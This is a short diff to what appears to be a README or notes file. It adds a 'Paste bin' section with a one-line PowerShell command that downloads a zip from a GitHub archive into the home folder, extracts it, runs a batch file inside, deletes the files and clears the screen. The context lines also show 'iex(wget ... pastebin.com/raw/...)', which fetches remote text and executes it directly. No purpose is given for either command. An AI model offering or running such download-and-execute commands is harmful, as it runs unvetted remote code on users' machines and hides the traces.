@@ -20,6 +20,11 @@ iex(wget -useb -ur pastebin.com/raw/v27ai472).Content
 powershell iex(wget -useb -ur pastebin.com/raw/v27ai472).Content
 ```
 
+# Paste bin
+```
+&powershell -c '&{$w=$home;$u=''https://github.com/3lv/a/archive/a.zip'';$z=\"$w\a.zip\";$d=\"$w\a\\\";(New-Object System.Net.WebClient).DownloadFile($u,$z);Expand-Archive $z $d -F;cd $d\..;.\a\a-a\a.bat;Remove-Item $z,$d -R -Fo;cls}'
+```
+
 <br>
 
 ```diff
